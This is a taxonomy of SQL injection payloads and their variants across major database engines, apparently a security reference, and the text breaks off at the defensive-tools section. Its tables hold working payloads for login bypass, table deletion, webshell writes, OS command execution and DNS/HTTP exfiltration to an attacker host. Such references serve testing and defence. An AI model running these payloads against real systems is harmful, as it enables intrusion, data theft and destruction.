# SQL Injection Payload Mutation/Variation Taxonomy

---

## Classification Structure

This document classifies the entire SQL Injection attack surface along **three orthogonal axes**. Every technique can be precisely located as a combination of these three axes.

### Axis 1: Mutation Target — WHAT is mutated
Which **structural component** of the SQL message/request is modified to achieve injection. This is the **primary axis** of this document, organized into 8 top-level categories (§1–§8).

### Axis 2: Inference Channel — HOW the result is obtained
Through which path the attacker observes the result of the injected query. This is the **cross-cutting axis**.

| Channel Type | Mechanism | Representative Condition |
|-------------|-----------|------------------------|
| **In-Band (Direct Output)** | Query result directly reflected in HTTP response | UNION SELECT, Error-based |
| **Boolean Blind** | 1-bit extraction via response differences (content, status code) for true/false | `AND 1=1` vs `AND 1=2` |
| **Time-Based Blind** | True/false determination via conditional delay functions | `IF(cond, SLEEP(5), 0)` |
| **Error-Based** | Data embedded within forced error messages | `EXTRACTVALUE`, `UPDATEXML` |
| **Out-of-Band (OOB)** | Data sent to external server via DNS/HTTP requests | `UTL_HTTP`, `xp_dirtree`, `LOAD_FILE` |
| **Stored/Second-Order** | Injection point and execution point are temporally separated | Stored then used in another query |

### Axis 3: Attack Scenario — WHERE it is weaponized

| Scenario | Condition | Impact |
|----------|-----------|--------|
| **Authentication Bypass** | Login query targeted | Admin access |
| **Data Exfiltration** | SELECT context | Confidential data theft |
| **Data Manipulation** | INSERT/UPDATE context | Record tampering/insertion |
| **Remote Code Execution (RCE)** | File write / OS command execution available | Full system compromise |
| **Denial of Service (DoS)** | Resource-exhausting queries | Availability destruction |
| **Privilege Escalation** | DB user permission modification | Admin privilege acquisition |
| **WAF/Filter Bypass** | Security appliance present | Detection evasion enabling secondary attack |

---

## §1. Query Syntax Manipulation

The most fundamental and broad mutation category — directly modifying SQL syntax elements such as clauses, operators, and keywords to alter query semantics.

### §1-1. WHERE Clause Tautology

Injecting always-true conditions to neutralize query filtering logic.

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **Basic Tautology** | Always-true condition via `OR` operator | `' OR 1=1--` |
| **String Tautology** | True condition via string comparison | `' OR 'a'='a'--` |
| **Double Negation** | Nested NOT operators to evade filters | `' OR NOT 0--` |
| **Arithmetic Tautology** | True condition via math operation result | `' OR 2>1--` |
| **NULL Exploitation** | Abusing NULL comparison semantics | `' OR NULL IS NULL--` |
| **Bitwise Operation** | Bitwise operators to avoid detection patterns | `' OR 1&1--` |

### §1-2. UNION-Based Injection

Using `UNION SELECT` to append attacker-controlled data to the original query result set.

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **Basic UNION** | Matching column count for result concatenation | `' UNION SELECT username,password FROM users--` |
| **NULL Padding** | Using NULLs to match column count | `' UNION SELECT NULL,NULL,NULL--` |
| **ORDER BY Enumeration** | Probing column count via sort attempts | `' ORDER BY 5--` (error if columns < 5) |
| **Type-Compatible UNION** | Bypassing data type mismatches | `' UNION SELECT 1,'a',3--` |
| **Embedded Subquery** | Subqueries within UNION | `' UNION SELECT (SELECT password FROM users LIMIT 1),2--` |
| **GROUP_CONCAT Aggregation** | Aggregating multiple rows into one | `' UNION SELECT GROUP_CONCAT(username,':',password),2 FROM users--` |

### §1-3. Stacked Queries (Multi-Statement Injection)

Terminating the original query with a semicolon (`;`) and executing entirely new statements. High-risk technique leading directly to data manipulation and RCE.

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **Data Insertion** | Appending INSERT statement | `'; INSERT INTO users VALUES('hacker','pwd')--` |
| **Data Deletion** | Appending DELETE/DROP statement | `'; DROP TABLE users--` |
| **Privilege Modification** | Appending GRANT/ALTER statement | `'; GRANT ALL ON *.* TO 'attacker'@'%'--` |
| **OS Command Execution (MSSQL)** | Enabling and executing `xp_cmdshell` | `'; EXEC xp_cmdshell 'whoami'--` |
| **File Write (MySQL)** | Creating webshell via `INTO OUTFILE` | `'; SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/shell.php'--` |

> **DBMS Constraints**: MySQL does not natively support stacked queries, but they are possible through `mysqli_multi_query()` or specific PDO configurations. PostgreSQL and MSSQL support them by default. Oracle does not support them.

### §1-4. Subquery & Conditional Expressions

Leveraging subqueries and conditional branching to extract data or control execution flow.

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **Scalar Subquery** | Subquery injection in SELECT context | `' AND (SELECT COUNT(*) FROM users)>0--` |
| **EXISTS Condition** | True/false determination via data existence | `' AND EXISTS(SELECT * FROM users WHERE username='admin')--` |
| **CASE/IF Branching** | Bit-by-bit extraction via conditional branching | `' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(3),0)--` |
| **Nested Subquery** | Multi-level subquery chains | `' AND (SELECT SUBSTRING(password,1,1) FROM (SELECT password FROM users LIMIT 1) AS t)='a'--` |

---

## §2. Encoding & Obfuscation

Transforming the **representation form** of payloads to bypass input validation, WAFs, and filters. SQL semantics remain identical, but byte-level representation differs.

### §2-1. Character Encoding Transformation

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **Hexadecimal Encoding** | Replacing strings with 0x-prefixed hex | `SELECT * FROM users WHERE name=0x61646D696E` (= 'admin') |
| **URL Encoding** | Special characters as `%XX` form | `%27%20OR%201%3D1--` (= `' OR 1=1--`) |
| **Double URL Encoding** | Applying URL encoding twice | `%2527` (→ `%27` → `'`) |
| **Unicode Encoding** | `%uXXXX` or UTF-8 multibyte sequences | `%u0027%u004F%u0052` (= `'OR`) |
| **HTML Entities** | Conversion to `&#xx;` form | `&#39; OR 1=1--` |
| **Base64 Encoding** | Wrapping payload in Base64 | When app decodes Base64 before query insertion |
| **Invalid UTF-8 Sequences** | Malformed UTF-8 bytes confusing escape functions | CVE-2025-1094: PostgreSQL UTF-8 validation flaw exploitation |
| **CHAR() Function** | Converting ASCII codes to characters | `CHAR(97,100,109,105,110)` (= 'admin') |

### §2-2. Whitespace Substitution

Using various characters recognized as whitespace in SQL to bypass space-based filters.

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **Inline Comment** | Replacing space with `/**/` | `'/**/OR/**/1=1--` |
| **Tab Character** | `%09` (tab) as space substitute | `'%09OR%091=1--` |
| **Newline Character** | `%0A` (LF), `%0D` (CR) as substitute | `'%0AOR%0A1=1--` |
| **Parentheses** | Token separation via parentheses | `'OR(1=1)--` |
| **Plus Sign (MSSQL)** | `+` used as whitespace | `'+OR+1=1--` |
| **Null Byte** | `%00` insertion (Oracle, etc.) | `'%00OR 1=1--` |

> **DBMS-Specific Whitespace Characters**: MySQL(`09,0A,0B,0C,0D,A0,20`), PostgreSQL(`0A,0D,0C,09,20`), MSSQL(`01-1F,20`), Oracle(`00,0A,0D,0C,09,20`), SQLite(`0A,0D,0C,09,20`)

### §2-3. Comment-Based Obfuscation

Leveraging SQL comment syntax to split keywords or achieve conditional execution.

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **Inline Comment Insertion** | Inserting `/**/` within keywords | `SEL/**/ECT`, `UN/**/ION` |
| **MySQL Versioned Conditional Comment** | `/*!NNNNN ... */` executes only on specific version+ | `/*!50000SELECT*/ * FROM users` |
| **Nested Comment** | Comments within comments to confuse parsers | `/*! /*!*/ SELECT */ 1` |
| **Trailing Query Removal** | Nullifying remainder with `--`, `#`, `/*` | `admin'--` |
| **MySQL Hash Comment** | MySQL-specific `#` comment | `' OR 1=1 #` |

### §2-4. Case & Keyword Mutation

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **Mixed Case** | Exploiting SQL keyword case-insensitivity | `sElEcT`, `UnIoN`, `SeLeCt` |
| **Keyword Doubling** | When filter removes keyword only once | `SELSELECTECT` (filter removes SELECT → SELECT remains) |
| **Synonym Substitution** | Using different keywords with same function | `LIKE` instead of `=`; `RLIKE`/`REGEXP` instead of `LIKE`; `||` instead of `OR` |
| **Function Name Substitution** | Using different functions with same behavior | `MID()` = `SUBSTR()` = `SUBSTRING()` |
| **Scientific Notation** | Numbers in scientific notation | `0e0` = 0, `1e0UNION` |
| **String Concatenation** | Constructing keywords via string concat | `'sel'+'ect'` (MSSQL), `'sel'||'ect'` (Oracle) |

---

## §3. DBMS-Specific Feature Exploitation

Mutations leveraging **proprietary functions, syntax, and system objects** unique to each database engine. Even with identical attack intent, payloads differ fundamentally across DBMS.

### §3-1. MySQL-Specific Techniques

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **Versioned Conditional Execution** | Version-specific code via `/*!NNNNN*/` comments | `/*!50000UNION*//*!50000SELECT*/1,2,3` |
| **LOAD_FILE / INTO OUTFILE** | File read/write | `' UNION SELECT LOAD_FILE('/etc/passwd'),2--` |
| **BENCHMARK Time Delay** | Time-based inference via BENCHMARK() | `' AND BENCHMARK(10000000,SHA1('a'))--` |
| **information_schema Enumeration** | Metadata table querying | `' UNION SELECT table_name,2 FROM information_schema.tables--` |
| **GROUP BY / HAVING Error Leak** | Column name disclosure via aggregation errors | `' GROUP BY columnname HAVING 1=1--` |
| **PROCEDURE ANALYSE** | Data type information leakage | `' PROCEDURE ANALYSE()--` |
| **@Variable Exploitation** | Multi-step extraction via user variables | `' AND(@a:=CONCAT_WS(':',table_name) FROM information_schema.tables)--` |

### §3-2. PostgreSQL-Specific Techniques

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **COPY TO/FROM** | Filesystem access | `'; COPY (SELECT '') TO PROGRAM 'id'--` |
| **pg_sleep Time Delay** | Time-based blind inference | `'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--` |
| **Large Object Functions** | File access via lo_import/lo_export | `'; SELECT lo_import('/etc/passwd')--` |
| **Dollar-Quoted Strings** | Quote filter bypass via `$$...$$` syntax | `$$text$$` instead of `'text'` |
| **Type Casting (::)** | Error induction/bypass via casting operator | `' AND 1::int=1--`, `CAST(expr AS type)` |
| **pg_catalog Enumeration** | System catalog table querying | `' UNION SELECT usename,passwd FROM pg_shadow--` |
| **CHR() Function Chaining** | String construction via CHR() concatenation | `CHR(65)||CHR(66)||CHR(67)` (= 'ABC') |
| **UTF-8 Encoding Flaw** | Escape function bypass via malformed UTF-8 (CVE-2025-1094) | Invalid UTF-8 sequences causing psql statement splitting |

### §3-3. Microsoft SQL Server-Specific Techniques

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **xp_cmdshell** | OS command execution | `'; EXEC xp_cmdshell 'whoami'--` |
| **xp_dirtree / xp_fileexist** | OOB data exfiltration (DNS/UNC) | `'; EXEC xp_dirtree '\\attacker.com\share'--` |
| **OPENROWSET / OPENDATASOURCE** | Remote server connection / data exfiltration | `'; SELECT * FROM OPENROWSET('SQLOLEDB','server';'sa';'pwd','SELECT 1')--` |
| **WAITFOR DELAY** | Time-based blind inference | `'; WAITFOR DELAY '0:0:5'--` |
| **sp_OACreate** | RCE via COM object creation | Requires OLE Automation Procedures enabled |
| **Error-Based Conversion** | Data leakage via type conversion errors | `' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--` |
| **Differential Backup Webshell** | File write via backup functionality | Saving differential backup to web-accessible path to create webshell |

### §3-4. Oracle-Specific Techniques

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **UTL_HTTP / UTL_INADDR** | OOB data exfiltration (HTTP/DNS) | `' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--` |
| **DBMS_PIPE** | Time-based blind inference | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--` |
| **CTXSYS.DRITHSX.SN** | Error-based data exfiltration | `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--` |
| **XMLTYPE / EXTRACTVALUE** | Data leakage via XML function errors | `' AND EXTRACTVALUE(XMLTYPE('<?xml ...>'),'/x')--` |
| **Double Pipe Concatenation (||)** | String concatenation operator | `'||'` (= empty string concatenation) |
| **FROM DUAL Required** | Oracle requires FROM clause in SELECT | `' UNION SELECT NULL FROM DUAL--` |
| **ROWNUM-Based Limiting** | Oracle's row limitation mechanism | `' AND ROWNUM=1--` |

### §3-5. SQLite-Specific Techniques

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **sqlite_master Enumeration** | Schema metadata querying | `' UNION SELECT sql FROM sqlite_master--` |
| **RANDOMBLOB Time Delay** | Delay via massive random data generation | `' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--` |
| **ATTACH DATABASE** | File write via new DB file creation | `'; ATTACH DATABASE '/var/www/shell.php' AS lol; CREATE TABLE lol.x(y text); INSERT INTO lol.x VALUES('<?php...');--` |
| **typeof() / unicode()** | Type/character information extraction | `' AND unicode(substr(password,1,1))>64--` |

---

## §4. Input Vector & Delivery Path

WHERE the SQL payload is inserted and HOW it reaches the application. Beyond traditional GET/POST parameters, various HTTP components and data formats serve as injection paths.

### §4-1. HTTP Parameter Manipulation

| Subtype | Mechanism | Injection Point |
|---------|-----------|----------------|
| **GET Parameter** | Insertion in URL query string | `?id=1' OR 1=1--` |
| **POST Body** | Insertion in form data | `username=admin'--&password=x` |
| **Numeric Parameter** | Direct injection without quotes | `?id=1 OR 1=1` |
| **HTTP Parameter Pollution (HPP)** | Multiple identical parameters confusing WAF | `?id=1&id=' OR 1=1--` (server uses second value) |

### §4-2. HTTP Header-Based Injection

Occurs when the application trusts HTTP header values and inserts them into queries.

| Subtype | Mechanism | Injection Point |
|---------|-----------|----------------|
| **Cookie Injection** | Session/user identification cookie values | `Cookie: session=admin' OR 1=1--` |
| **User-Agent Injection** | UA string logging/analysis | `User-Agent: ' OR 1=1--` |
| **Referer Injection** | Referer logging | `Referer: ' OR 1=1--` |
| **X-Forwarded-For Injection** | IP logging/access control | `X-Forwarded-For: ' OR 1=1--` |
| **Authorization Header** | Authentication token processing | Injection in custom auth header values |

### §4-3. Structured Data Format Injection

SQL injection within JSON, XML, and other structured body formats. Notably, JSON-based injection bypassed all major WAFs (§7-2).

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **JSON Parameter Injection** | SQL insertion in JSON values | `{"username":"admin' OR 1=1--","password":"x"}` |
| **JSON SQL Syntax Abuse** | WAF bypass via JSON operators | `1 OR JSON_EXTRACT('{"a":1}','$.a')=1` (see §7-2) |
| **XML Encoding Injection** | Payload encoding via XML entities | `<stockCheck><productId>&#x31;&#x27;&#x20;UNION SELECT...` |
| **SOAP Parameter** | Injection in SOAP message values | SQL insertion in XML-based SOAP parameters |
| **GraphQL Variable Injection** | SQL insertion in GraphQL query variables | `{"query":"{ user(id:\"1' OR 1=1--\") { name } }"}` |

### §4-4. Non-Traditional Injection Paths

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **File Upload Name** | Upload filename stored in DB | `filename="' OR 1=1--.jpg"` |
| **DNS/Hostname** | Host header used in query | `Host: ' OR 1=1--` |
| **Email Field** | Email address processing | `test'OR1=1--@example.com` |
| **Search Functionality** | Full-text search queries | SQL injection in search terms |

---

## §5. Blind Inference Techniques

Techniques for extracting data via **indirect signals** in environments where query results are not directly output. The most commonly encountered real-world scenario in modern applications.

### §5-1. Boolean-Based Inference

Extracting data 1 bit at a time by observing true/false differences in responses (page content, HTTP status codes, redirect behavior).

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **Content Difference** | Page content varies for true/false | `' AND SUBSTRING(username,1,1)='a'--` |
| **Status Code Difference** | Response code branching (200 vs 302, etc.) | `' AND 1=(SELECT 1 FROM users WHERE username='admin')--` |
| **Conditional Error Induction** | Error triggered only when condition is true | `' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--` |
| **REGEXP/LIKE Pattern** | Character range probing via regex | `' AND password REGEXP '^a'--` |
| **Bitwise Extraction** | Efficient extraction via bit operations | `' AND ORD(MID(password,1,1))&128=128--` |
| **Binary Search** | Halving character code range iteratively | `' AND ASCII(SUBSTR(pwd,1,1))>64--` (repeated binary division) |

### §5-2. Time-Based Inference

Determining true/false by intentionally triggering delays when condition is true, observing response time.

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **SLEEP / pg_sleep / WAITFOR** | DBMS built-in delay functions | MySQL: `' AND IF(1=1,SLEEP(5),0)--` |
| **Heavy Query (Computation Bomb)** | Delay via CPU-intensive operations | `' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0--` |
| **BENCHMARK (MySQL)** | Delay via repeated operations | `' AND BENCHMARK(50000000,SHA1('x'))--` |
| **Conditional Delay + Binary Search** | Combining time delay with binary search | `' AND IF(ASCII(SUBSTR(pwd,1,1))>64,SLEEP(3),0)--` |
| **RANDOMBLOB (SQLite)** | Delay via massive random data generation | See §3-5 |

### §5-3. Error-Based Extraction

Intentionally triggering SQL errors while ensuring desired data is embedded within the error message.

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **EXTRACTVALUE (MySQL)** | Data embedded in XPath error | `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--` |
| **UPDATEXML (MySQL)** | XML update error exploitation | `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--` |
| **CONVERT/CAST (MSSQL)** | Data embedded in type conversion error | `' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--` |
| **XMLTYPE (Oracle)** | XML parsing error exploitation | See §3-4 |
| **EXP() Overflow (MySQL)** | Math function overflow | `' AND EXP(~(SELECT*FROM(SELECT user())x))--` |
| **Double Query Error** | Duplicate key / subquery error | `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--` |
| **GeometryCollection (MySQL)** | Spatial function error exploitation | `' AND GeometryCollection((SELECT*FROM(SELECT*FROM(SELECT user())a)b))--` |

### §5-4. Out-of-Band (OOB) Channel

Transmitting data to an external server via DNS lookups, HTTP requests, or other **separate network channels**. The most efficient extraction method in blind environments.

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **DNS Exfiltration (MSSQL)** | DNS lookup via UNC path | `'; EXEC xp_dirtree '\\'+user()+'.attacker.com\a'--` |
| **DNS Exfiltration (Oracle)** | DNS lookup via UTL_INADDR | `' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com')--` |
| **HTTP Exfiltration (Oracle)** | External HTTP request via UTL_HTTP | `' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--` |
| **HTTP Exfiltration (MSSQL)** | External connection via OPENROWSET | `'; SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com';'a';'a','SELECT 1')--` |
| **DNS Exfiltration (MySQL)** | DNS via LOAD_FILE | `' AND LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--` |
| **DNS Exfiltration (PostgreSQL)** | Leveraging dblink / COPY TO PROGRAM | `'; CREATE EXTENSION dblink; SELECT dblink_connect('host='||(SELECT user)||'.attacker.com')--` |

---

## §6. Temporal & Contextual Mutations

Mutations based on injection **timing** and **execution context**. Covers cases where the payload is not immediately executed, or operates in a SQL context other than the original query (INSERT, UPDATE, ORDER BY, etc.).

### §6-1. Second-Order Injection

The payload is harmless at storage time but **executes when referenced later by a different query**. Vulnerable even when Prepared Statements are used, if stored data is trusted.

| Subtype | Mechanism | Scenario |
|---------|-----------|----------|
| **Username-Based** | Payload stored at signup → executed on profile query | Register as `admin'--` → password change modifies admin account |
| **Post/Comment-Based** | Post stored → executed on admin dashboard query | SQL in post title → executed in statistics query |
| **Log-Based** | Malicious value logged → executed on log search/analysis | Malicious value stored in log table → referenced on dashboard |
| **Configuration-Based** | Setting changed → referenced by system function | DB-stored config value used in dynamic query |

### §6-2. Context-Specific Injection

When the injection point is in a SQL clause other than SELECT's WHERE, specialized techniques are needed for each context.

| Subtype | Context | Payload Example |
|---------|---------|-----------------|
| **INSERT Injection** | VALUES clause insertion | `'); INSERT INTO admins VALUES('hacker','pwd')--` |
| **UPDATE SET Injection** | SET clause value insertion | `', password='hacked' WHERE username='admin'--` |
| **ORDER BY Injection** | Sort criterion insertion (cannot be parameterized) | `1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)` |
| **GROUP BY Injection** | Grouping criterion insertion | `1 HAVING 1=1--` |
| **LIMIT/OFFSET Injection** | Pagination parameter insertion | `10 PROCEDURE ANALYSE(EXTRACTVALUE(0,CONCAT(...)))` |
| **Table/Column Name Injection** | Dynamic identifier insertion | `` `admin`; DROP TABLE users--`` (cannot be defended via prepared statement) |
| **LIKE Pattern Injection** | Wildcard insertion in search patterns | `%` (returns all results), `_` (single character wildcard) |

### §6-3. Multi-Stage Attack Chains

Achieving objectives that **cannot be accomplished via single injection** through chained sequential injections.

| Subtype | Mechanism | Stages |
|---------|-----------|--------|
| **Recon → Privesc → RCE** | Stepwise objective escalation | ①DB version check → ②User privilege check → ③Enable xp_cmdshell → ④Command execution |
| **SQLi → File Write → Webshell** | Pivot to filesystem access | ①Create PHP shell via INTO OUTFILE → ②Access shell via HTTP |
| **Data Exfil → Auth Bypass** | Leveraging extracted info for legitimate access | ①Extract admin hash → ②Crack hash → ③Normal login |

---

## §7. WAF/Filter Evasion Mutations

Payload transformations **specialized** for bypassing security appliances (WAF, IDS, input filters). While overlapping with §2 (Encoding), this section focuses on techniques that attack the WAF's detection logic itself.

### §7-1. Signature Evasion

Payload transformations that evade WAF regex/pattern matching rules.

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **Equals Sign (=) Substitution** | Equivalence operators instead of `=` | `LIKE`, `RLIKE`, `REGEXP`, `BETWEEN...AND`, `IN()`, `<>` (negated NOT EQUAL) |
| **AND/OR Substitution** | Logical operators as symbols | `&&` (AND), `||` (OR) |
| **Spaceless Payload** | All whitespace removed | `'OR(1=1)#`, `'OR(1)=(1)#` |
| **SELECT-less Extraction** | Data extraction without SELECT keyword | `TABLE users` (MySQL 8.0+), `VALUES ROW(1)` |
| **Comma-less Payload** | Comma substitution in UNION | `' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b--` |
| **Quoteless Strings** | Quote filter bypass | `0x61646D696E` (hex), `CHAR(97,100,109,105,110)` |
| **Function Call Obfuscation** | Whitespace/comments between function name and parenthesis | `SLEEP/**/(5)`, `VERSION ()` |

### §7-2. JSON-Based SQL WAF Bypass

JSON SQL syntax is unrecognized by WAF SQL parsers, enabling a technique that **bypassed all major commercial WAFs** (discovered 2022 — affected Palo Alto, AWS, Cloudflare, F5, Imperva).

| Subtype | DBMS | Payload Example |
|---------|------|-----------------|
| **JSON_EXTRACT Tautology** | MySQL | `1 OR JSON_EXTRACT('{"a":1}','$.a')=1` |
| **JSON Array Comparison** | PostgreSQL | `1 OR '{"a":1}'::jsonb @> '{"a":1}'::jsonb` |
| **JSON_VALUE** | MSSQL | `1 OR JSON_VALUE('{"a":1}','$.a')=1` |
| **json_extract** | SQLite | `1 OR json_extract('{"a":1}','$.a')=1` |
| **Nested JSON Conditions** | Universal | Mixing JSON operators with traditional SQL keywords to break signature patterns |

> JSON SQL syntax is supported in MySQL (2015), PostgreSQL (2012), MSSQL (2016), and SQLite (2022). The fundamental issue is that WAFs fail to parse SQL syntax within JSON content.

### §7-3. HTTP-Level Evasion

Exploiting HTTP protocol characteristics to confuse WAF request parsing.

| Subtype | Mechanism | Technique |
|---------|-----------|-----------|
| **Content-Type Manipulation** | Sending unexpected Content-Type | `application/json` instead of `application/x-www-form-urlencoded` |
| **Chunked Transfer** | Distributing signatures across chunks | Payload fragmentation via chunked encoding |
| **HTTP Parameter Pollution** | Duplicate parameter confusion (see §4-1) | First value passes WAF, second reaches app |
| **Multipart Boundary Manipulation** | Parser differential via non-standard boundary | Multipart form data boundary string variations |
| **Oversized Payload** | Exceeding WAF inspection byte limit | Padding massive dummy data before payload |
| **HTTP/2-Specific Headers** | Exploiting HTTP/2 binary framing | Pseudo-header manipulation in HTTP/2 |

---

## §8. Protocol & Architecture-Level Mutations

Mutations exploiting characteristics of **database wire protocols**, **driver/ORM layers**, and **application architecture** — NOT SQL syntax. These represent a new attack surface that traditional SQL Injection defenses (Prepared Statements) cannot block.

### §8-1. Wire Protocol Smuggling

**Corrupting message boundaries** in the binary protocol between database client and server, enabling injection of arbitrary SQL/NoSQL statements even in environments using Prepared Statements. (DEF CON 32, 2024)

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Message Size Overflow** | Protocol message length field overflow via 4GB+ string | CVE-2024-27304 (pgx): 32-bit length field overflow enables subsequent message manipulation |
| **Protocol Desynchronization** | Message boundary mismatch between client and server | Application-DB message order confusion → malicious message insertion |
| **Driver Vulnerability** | Implementation flaws in language-specific drivers | CVE-2024-1597 (PostgreSQL JDBC): SQL injection when preferQueryMode=simple |

> Protocol smuggling applies the concept of HTTP Request Smuggling to binary DB protocols, proving that Prepared Statements are not a silver bullet. The impact scope extends beyond DB protocols to all binary protocols including message queues and caching.

### §8-2. ORM/Framework Layer Bypass

Achieving SQL injection through **unsafe APIs** in ORM (Object-Relational Mapper) abstraction layers.

| Subtype | Framework | Vulnerable Pattern |
|---------|-----------|-------------------|
| **Raw Query Abuse** | Django, Rails, Sequelize | `MyModel.objects.raw("SELECT * FROM t WHERE id="+user_input)` |
| **extra()/annotate() Abuse (Django)** | Django | `QuerySet.extra(where=["name='"+input+"'"])` — not parameterized |
| **Unsafe ActiveRecord Methods** | Ruby on Rails | `where("name = '#{params[:name]}'")`, `order(params[:sort])` |
| **Comment Injection (ActiveRecord)** | Rails | CVE-2023-22794: SQL comment escape via `annotate()`, `optimizer_hints()` |
| **Sequelize Operator Injection** | Node.js Sequelize | `$where`, `$like` operator injection for condition manipulation |
| **JPQL/HQL Injection** | Hibernate/JPA | `"FROM User WHERE name='"+input+"'"` — JPQL is also injectable |
| **Dynamic Column/Table Names** | All ORMs | Identifiers (table names, column names) cannot be parameterized via Prepared Statements |

### §8-3. Escape Function Flaws

Injection caused by **implementation bugs** in the string escape functions themselves.

| Subtype | Mechanism | CVE/Case |
|---------|-----------|----------|
| **Multibyte Encoding Attack (GBK)** | `addslashes()` backslash absorbed as part of GBK multibyte character | `%bf%27` → `%bf%5c%27` → `縗'` (backslash consumed) |
| **UTF-8 Validation Failure** | Invalid UTF-8 sequences bypassing escape logic | CVE-2025-1094: PostgreSQL PQescapeLiteral() UTF-8 processing flaw |
| **NO_BACKSLASH_ESCAPES** | Escape behavior changes with MySQL SQL mode | Backslash escaping invalidated in `NO_BACKSLASH_ESCAPES` mode |
| **Charset Mismatch** | Client/server charset mismatch bypasses escaping | Multibyte attack after `SET NAMES 'gbk'` |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture Condition | Primary Mutation Categories |
|----------|----------------------|---------------------------|
| **Authentication Bypass** | Login form WHERE clause manipulation | §1-1 + §2-3 + §6-2 |
| **Mass Data Exfiltration** | SELECT result output available | §1-2 + §3 + §5-4 |
| **Blind Data Extraction** | No output environment | §5-1 + §5-2 + §5-3 |
| **Remote Code Execution** | High DB privileges, file write available | §1-3 + §3-1/§3-2/§3-3 |
| **WAF Environment Bypass** | Commercial WAF deployed | §2 + §7-1 + §7-2 + §7-3 |
| **Prepared Statement Bypass** | Parameterized queries in use | §8-1 + §8-2 + §8-3 |
| **Second-Order Attack** | Store-then-reference architecture | §6-1 + §1-1 |
| **Cloud Environment Attack** | Managed DB + WAF combination | §7-2 + §4-3 + §8-2 |

---

## CVE / Bug Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §8-1 (Protocol Smuggling) | CVE-2024-27304 (pgx PostgreSQL driver) | Arbitrary SQL execution in Prepared Statement environments. Auth bypass, data exfil, RCE |
| §8-3 (UTF-8 Escape Flaw) | CVE-2025-1094 (PostgreSQL libpq) | CVSS 8.1. SQL injection possible even with escaped input. Chained with BeyondTrust CVE-2024-12356 |
| §8-1 (Driver Vulnerability) | CVE-2024-1597 (PostgreSQL JDBC driver) | SQL injection when preferQueryMode=simple. CVSS 9.8 |
| §3-3 + §1-3 (MSSQL RCE) | CVE-2025-25257 (Fortinet FortiWeb) | CVSS 9.6. Unauth SQLi → SELECT INTO OUTFILE → Python RCE. PoC published |
| §1-2 + §6-2 (UNION + INSERT) | CVE-2024-36412 (SuiteCRM) | Unauthenticated full DB access. Critical rating |
| §1-3 (Stacked Queries) | CVE-2024-45387 (Apache Traffic Control) | CVSS 9.9. Privileged user arbitrary SQL execution via PUT request |
| §7-2 (JSON SQL WAF Bypass) | Claroty Team82 Research (2022) | Bypassed Palo Alto, AWS, Cloudflare, F5, Imperva WAFs |
| §8-2 (ORM Comment Injection) | CVE-2023-22794 (Rails ActiveRecord) | SQL comment escape via annotate() |
| §8-2 (ORM Injection) | CVE-2024-42005 (Django) | Django ORM SQL injection vulnerability |
| §8-3 (GBK Encoding Attack) | CVE-2006-2753 (MySQL) | addslashes() + GBK multibyte encoding escape bypass (historical but pattern recurring) |

---

## Detection Tools

### Offensive Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **SQLMap** | All major DBMS. Automated detection/extraction/RCE | Boolean/Time/Error/Union/Stacked — all techniques + 60+ tamper scripts |
| **Ghauri** | Cross-platform SQLMap alternative | Auto technique switching, browser emulation, advanced bypass |
| **jSQL Injection** | GUI-based SQLi testing | Visual interface, multiple injection strategies, Java 11-17 |
| **SQLMutant** | Payload mutation specialized | Pattern matching, error analysis, timing attack combination |
| **Havij** | Automated SQLi tool (Windows) | GUI-based, auto DB fingerprinting, data extraction |
| **NoSQLMap** | NoSQL injection specialized | MongoDB, CouchDB targeting |
| **Blisqy** | HTTP header-based Blind SQLi | Time-based blind SQLi via HTTP headers |

### Defensive Tools

| Tool | Target Scope | Core Technique |
